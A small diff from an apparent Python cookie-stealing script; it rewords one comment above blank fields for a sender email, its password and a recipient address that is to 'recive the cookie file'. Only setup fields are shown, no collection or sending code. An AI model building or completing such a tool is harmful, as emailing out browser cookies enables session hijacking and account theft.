@@ -8,7 +8,7 @@ import getpass
 
 username = getpass.getuser()
 
-#INSERT DATA HERE
+#INSERT DATA BETWEEN THE QUOTATION MARKS DOWN HERE
 email_user = ""         #The e-mail adress to use to send the cookie file (less secure apps enabled)
 email_password = ""     #The password of the e-mail above
 email_send = ""         #The e-mail adress to recive the cookie file (can be the same as the first)
